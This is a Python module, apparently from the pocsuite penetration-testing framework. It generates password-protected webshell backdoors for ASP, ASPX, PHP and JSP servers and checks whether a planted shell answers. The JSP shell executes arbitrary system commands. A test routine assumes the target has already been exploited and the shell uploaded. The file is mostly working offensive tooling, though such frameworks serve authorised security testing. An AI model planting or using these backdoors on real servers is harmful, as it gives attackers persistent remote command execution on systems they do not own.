#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Copyright (c) 2014-2016 pocsuite developers (https://seebug.org)
See the file 'docs/COPYING' for copying permission
"""

import requests
from pocsuite.lib.utils import randoms


class Webshell(object):

    def __init__(self):
        self.password = randoms.rand_text_alphanumeric(16)

    def has_shell(self, url, password, flag_code, flag_match):
        """Check if a shell is available.

        param: url, a shell url
        param: password, shell password
        param: flag_code,  let shell execute the code
        param: flag_match, flag
        """
        try:
            resp = requests.post(url, data={password: flag_code}, timeout=15)
            if resp and flag_match in resp.content:
                return True
        except (requests.ConnectionError, requests.Timeout):
            pass

        return False

    def asp(self):
        """Generate a asp backdoor"""
        backdoor = '<%eval request("{}")%>'.format(self.password)
        flag_code = 'Response.Write(Replace("<T>","T","{}"))'.format(
            self.password)
        flag_match = '<{}>'.format(self.password)
        return backdoor, flag_code, flag_match

    def aspx(self):
        """Generate a aspx backdoor"""
        backdoor = ('<%@ Page Language="Jscript"%>'
                    '<%eval(Request.Item["{}"],"unsafe");%>').format(
                        self.password)
        flag_code = 'Response.Write(Replace("<T>","T","{}"))'.format(
            self.password)
        flag_match = '<{}>'.format(self.password)
        return backdoor, flag_code, flag_match

    def php(self):
        """Generate a php backdoor"""
        backdoor = '<?php @eval($_POST["{}"]);?>'.format(self.password)
        flag_code = 'echo "<{}>";die();'.format(self.password)
        flag_match = '<{}>'.format(self.password)
        return backdoor, flag_code, flag_match

    def jsp(self):
        """Generate a jsp backdoor"""
        backdoor = ('<%@ page import="java.util.*,java.io.*" %>'
                    '<%@ page import="java.io.*"%>'
                    '<%@ page import="java.util.*"%>'
                    '<%'
                    'String cmd = request.getParameter("{password}");'
                    'if (cmd != null && "debug".equals(cmd))'
                    '    out.println("<T>".replace("T","{password}"));'
                    'else if (cmd != null && !"".equals(cmd))'
                    '{{'
                    '    Process p = Runtime.getRuntime().exec(cmd);'
                    '    OutputStream os = p.getOutputStream();'
                    '    InputStream in = p.getInputStream();'
                    '    DataInputStream dis = new DataInputStream(in);'
                    '    String disr = dis.readLine();'
                    '    while ( disr != null)'
                    '    {{'
                    '        out.println(disr);'
                    '        disr = dis.readLine();'
                    '    }}'
                    '}}%>').format(password=self.password)
        flag_code = 'debug'
        flag_match = "<{}>".format(self.password)
        return backdoor, flag_code, flag_match


def test_jsp_backdoor():
    # Notice: only check the backdoor created by Webshell class

    # exploit the target, and upload the webshell backdoor
    # ......

    url = raw_input('[*] JSP backdoor-url: ')
    ws = Webshell()
    ws.password = raw_input('[*] backdoor-password: ')
    backdoor, flag_code, flag_match = ws.jsp()

    if ws.has_shell(url, ws.password, flag_code, flag_match):
        print('[+] get shell successfully.')
    else:
        print('[-] wish you good chance next time')
